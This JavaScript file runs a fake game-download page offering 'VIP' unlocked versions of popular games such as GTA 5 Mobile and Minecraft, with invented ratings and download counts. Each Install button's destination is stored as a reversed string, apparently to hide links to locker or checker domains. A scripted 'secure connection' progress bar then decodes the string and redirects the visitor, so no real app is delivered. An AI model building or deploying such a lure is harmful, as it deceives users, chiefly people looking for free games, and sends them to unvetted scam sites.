const appData = [
    ["Brawl Stars Pro", "https://i.postimg.cc/pLx3994j/a75502cbdd3578e9fc148dc81045e8dc.jpg", "m832xe/i/lc/enilno.ppaetacitnehtua//:sptth", "4.8", "5.2M", "All Characters Available • Premium Access"],
    ["Temple Run 2", "https://i.postimg.cc/Jh09gPHb/images.webp", "kpvo2d/i/lc/erots.ppaymkcehc//:sptth", "4.8", "3.0M", "Premium Unlock • No Advertisements"],
    ["Poppy Playtime 5", "https://i.postimg.cc/RCW4g6rv/images-(2).jpg", "k2lln5/i/lc/enilno.ppaetacitnehtua//:sptth", "4.9", "1.5M", "Complete Story Mode • Clean Interface"],
    ["Fifa Street 2 Mobile", "https://i.postimg.cc/gcwd46F6/fifa-street-2.png", "kgjvj7/i/lc/enilno.ppaetacitnehtua//:sptth", "4.8", "2.2M", "All Teams Available • Classic UI"],
    ["Car Parking M.", "https://i.postimg.cc/SN6vfCPD/855bb14ff7d1a7833d3fcd31841cd486.jpg", "693o2d/i/lc/enilno.ppaetacitnehtua//:sptth", "4.9", "2.8M", "All Cars Unlocked • Premium Features"],
    ["Spider-Man 2 Mobile", "https://i.postimg.cc/FHLX56wW/images-(1).jpg", "8ke35m/i/lc/erots.ppaymkcehc//:sptth", "4.9", "3.4M", "Full Exploration Mode • HD Textures"],
    ["CarX Drift Racing 2", "https://i.postimg.cc/76R13gHD/1683877186-carx-drift-racing-2.png", "mx4l43/i/lc/enilno.ppaetacitnehtua//:sptth", "4.9", "4.1M", "Complete Garage Access • Smooth Play"],
    ["Real Racing 3", "https://i.postimg.cc/Ss2h5p1z/59d734a3a0393d260f23865083fd2e18.jpg", "4l9rem/i/lc/ten.ppadekcol//:sptth", "4.9", "2.8M", "All Tracks Unlocked • Premium Features"],
    ["GTA 5 Mobile", "https://upload.wikimedia.org/wikipedia/en/a/a5/Grand_Theft_Auto_V.png", "2m7n6o/i/lc/moc.rekcehcllatsni//:sptth", "4.7", "5.1M", "Full City Access • Enhanced Graphics"],
    ["Snake Mod Menu", "https://i.postimg.cc/j51BnqYy/NG4s-ZTG49qp-KGd3t-Uxdoxb-W2EXSp1-n-Axc-Yr3XCO0SO1WO5P2s-Wkk0s-Bt-UGZPYz-POU0-s150-rw.png", "7j4l43/i/lc/enilno.ppaetacitnehtua//:sptth", "4.7", "1.2M", "Advanced Controls • Custom Themes"],
    ["Minecraft", "https://i.postimg.cc/cHHJqfpb/3ff42c8168cb146b6a0458e6b81c8d2e.jpg", "xmvlov/i/lc/moc.rekcehcllatsni//:sptth", "5.0", "4.2M", "Creative Mode Plus • All Textures"],
    ["Terraria", "https://cdn.cloudflare.steamstatic.com/steam/apps/105600/header.jpg", "295p6g/i/lc/moc.rekcehcllatsni//:sptth", "4.8", "1.9M", "Explorer Edition • All Items Available"],
    ["Stumble Guys 2026", "https://i.postimg.cc/jdq2Fg30/288f59ad4205a9503c3a91cb016e032a.jpg", "ner55m/i/lc/etis.rekcehcppa//:sptth", "4.9", "4.5M", "All Customizations • No Ads Version"],
    ["BeamNG.drive", "https://i.postimg.cc/y60nsB6F/779488e457a22a3592a631f255172ebd.jpg", "3q7v28/i/lc/erots.ppaymkcehc//:sptth", "4.9", "2.6M", "Advanced Physics • Full Sandbox"]
];

function renderApps(data) {
    let grid = document.getElementById("main-grid");
    let html = "";
    for(let i=0; i<data.length; i++) {
        let app = data[i];
        html += `
        <div class="app-box">
            <span class="badge">VIP</span>
            <img loading="lazy" src="${app[1]}" alt="${app[0]}">
            <div class="app-content">
                <div class="app-title">${app[0]}</div>
                <div class="meta" style="display:flex; justify-content:space-between; font-size:12px;">
                    <div>⭐ ${app[3]}</div>
                    <div style="color:#22c55e; font-weight:bold">${app[4]}</div>
                </div>
                <div class="app-desc">${app[5]}</div>
                <button class="action-btn" onclick="startSecureConnection('${app[2]}')">Install</button>
            </div>
        </div>`;
    }
    grid.innerHTML = html;
}

document.getElementById("search-input").oninput = function(e) {
    let val = e.target.value.toLowerCase();
    let filtered = appData.filter(app => app[0].toLowerCase().includes(val));
    renderApps(filtered);
};

function startSecureConnection(scrambledHash) {
    let modal = document.getElementById("secure-modal"), 
        bar = document.getElementById("progress-fill"), 
        perc = document.getElementById("progress-text"),
        desc = document.getElementById("status-desc");
    
    modal.style.display="flex"; 
    bar.style.width="0%";
    perc.innerText = "0%";
    desc.innerText = "Connecting to server...";
    
    perc.style.color = document.body.classList.contains('dark') ? "#fff" : "#1a1a1a";

    let p=0;
    let timer = setInterval(()=>{
        p += Math.floor(Math.random() * 6) + 1; 
        if(p > 100) p = 100;
        
        bar.style.width = p + "%";
        perc.innerText = p + "%";

        if(p > 30 && p < 70) desc.innerText = "Establishing secure route...";
        if(p >= 70 && p < 100) desc.innerText = "Preparing application access...";
        
        if(p >= 100) {
            clearInterval(timer);
            desc.innerText = "Redirecting securely...";
            
            setTimeout(() => {
                let finalUrl = scrambledHash.split('').reverse().join('');
                window.location.href = finalUrl; 
            }, 100);
        }
    }, 120);
}

function closeDialog(){ document.getElementById("secure-modal").style.display="none"; }
function switchMode(){ document.body.classList.toggle("dark"); }

renderApps(appData);
